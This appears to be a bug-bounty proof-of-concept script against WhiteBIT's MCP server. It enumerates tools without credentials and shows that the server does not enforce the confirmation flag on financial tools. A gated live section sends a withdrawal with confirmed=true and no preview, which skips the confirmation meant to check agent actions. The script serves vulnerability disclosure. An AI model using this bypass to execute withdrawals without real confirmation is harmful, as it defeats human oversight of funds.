#!/usr/bin/env python3
"""
PoC: WhiteBIT MCP server - financial-operation confirmation gate is advisory, not enforced.

Target : https://mcp.whitebit.com/mcp   (whitebit-mcp v1.1.0)
Scope  : HackenProof "WhiteBIT" program, target "whitebit.com" (Web).
         mcp.whitebit.com is a subdomain of the in-scope apex; WhiteBIT's own
         public Bug Bounty Policy lists "whitebit.com" as a detection resource.

SAFE BY DEFAULT. This script performs only:
  * MCP `initialize` / `tools/list` / `resources/list`
  * one public tool call (server__ping)
  * ONE account-scoped read call (main_account__get_custom_fee) with NO credentials,
    used purely to show where the auth boundary is.

It NEVER calls a financial tool. No funds, orders, or account data are touched.

To complete step 5 of the report (single-call execution on your OWN account),
see LIVE_DEMO below, which is hard-disabled unless you set RUN_LIVE=1 and supply
your own credentials.
"""

import json
import os
import sys
import urllib.error
import urllib.request

MCP_URL = "https://mcp.whitebit.com/mcp"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36"


def http_post(payload, session_id=None, extra_headers=None):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
        "User-Agent": UA,
    }
    if session_id:
        headers["mcp-session-id"] = session_id
    headers.update(extra_headers or {})
    req = urllib.request.Request(
        MCP_URL, data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)


def tool_text(resp):
    try:
        d = json.loads(resp)
    except Exception:
        return resp[:300]
    res = d.get("result", {})
    if "content" in res:
        return "".join(c.get("text", "") for c in res["content"])[:300]
    return json.dumps(d)[:300]


def main():
    print("=" * 74)
    print("WhiteBIT MCP - unauthenticated surface & confirmation-gate analysis")
    print("=" * 74)

    # ---- 1. initialize with ZERO credentials -------------------------------
    st, body, hdrs = http_post(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "poc", "version": "1.0"},
            },
        }
    )
    print(f"\n[1] initialize (no credentials)  -> HTTP {st}")
    sid = hdrs.get("mcp-session-id") or hdrs.get("Mcp-Session-Id")
    init = json.loads(body)["result"]
    print(f"    serverInfo : {init['serverInfo']}")
    print(f"    session id : {sid}")
    print("    NOTE: WhiteBIT docs state the HTTP /mcp endpoint 'answers 401 to a")
    print("          connection that carries no credentials at all'. It answers 200 here.")

    # ---- 2. enumerate tools without credentials ---------------------------
    st, body, _ = http_post({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, sid)
    tools = json.loads(body)["result"]["tools"]
    print(f"\n[2] tools/list (no credentials)   -> HTTP {st}  ({len(tools)} tools)")

    # ---- 3. financial tools: is `confirmed` required? ----------------------
    fin = [t for t in tools if "confirmed" in (t.get("inputSchema", {}).get("properties") or {})]
    optional, required = [], []
    for t in fin:
        (req := t["inputSchema"].get("required") or [])
        (required if "confirmed" in req else optional).append(t["name"])
    print(f"\n[3] financial tools exposing a 'confirmed' flag: {len(fin)}")
    print(f"    'confirmed' OPTIONAL (client-supplied boolean only) : {len(optional)}")
    print(f"    'confirmed' REQUIRED (server would reject otherwise)  : {len(required)}")
    for n in optional:
        print(f"      - {n}")

    # Tools that DO bind server-side state between preview and execution:
    bound = [
        t["name"]
        for t in tools
        if any(
            k in (t.get("inputSchema", {}).get("properties") or {})
            for k in ("query_id", "preview_id", "confirmation_token")
        )
    ]
    print(f"\n    tools binding a server-issued token to execution: {bound or 'none'}")
    print("    -> convert__confirm requires a server-issued `query_id`, proving the")
    print("       codebase can bind preview->execute. The withdrawal/order tools above")
    print("       do NOT: `confirmed=true` alone is sufficient, in a single call.")

    # ---- 4. where is the auth boundary? -----------------------------------
    st, body, _ = http_post(
        {"jsonrpc": "2.0", "id": 10, "method": "tools/call",
         "params": {"name": "server__ping", "arguments": {}}}, sid)
    print(f"\n[4a] public tool server__ping (no creds) -> HTTP {st} : {tool_text(body)}")

    st, body, _ = http_post(
        {"jsonrpc": "2.0", "id": 11, "method": "tools/call",
         "params": {"name": "main_account__get_custom_fee", "arguments": {}}}, sid)
    print(f"[4b] account tool main_account__get_custom_fee (no creds) -> HTTP {st}")
    print(f"     {tool_text(body)}")
    print("     -> 401 passthrough: the server holds no credentials of its own and")
    print("        forwards client-supplied keys to the WhiteBIT API. No account access.")

    # ---- 5. OPTIONAL live single-call demo (own account only) -------------
    print("\n[5] Single-call execution demo: DISABLED (requires your own credentials)")
    if os.environ.get("RUN_LIVE") != "1":
        print("    Set RUN_LIVE=1 and export WB_KEY / WB_SECRET to enable.")
        print("    Use a dedicated sub-account holding a trivial amount, per WhiteBIT's")
        print("    own 'Safe account practices' guidance. Never use main-account funds.")
        return 0

    key = os.environ.get("WB_KEY")
    secret = os.environ.get("WB_SECRET")
    if not key or not secret:
        print("    RUN_LIVE=1 but WB_KEY / WB_SECRET are not set. Aborting.")
        return 1

    print("\n    Calling main_account__withdraw ONCE, with confirmed=true,")
    print("    and NO prior preview call. A successful withdrawal here proves the")
    print("    confirmation gate is not server-enforced.")
    st, body, _ = http_post(
        {"jsonrpc": "2.0", "id": 20, "method": "tools/call",
         "params": {"name": "main_account__withdraw", "arguments": {
             "ticker": os.environ.get("WB_TICKER", "USDT"),
             "amount": os.environ.get("WB_AMOUNT", "1"),
             "address": os.environ["WB_ADDRESS"],
             "network": os.environ.get("WB_NETWORK", "TRC20"),
             "unique_id": "poc-" + os.urandom(8).hex(),
             "confirmed": True,
         }}},
        sid, {"X-WB-Api-Key": key, "X-WB-Secret-Key": secret})
    print(f"    HTTP {st}: {tool_text(body)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
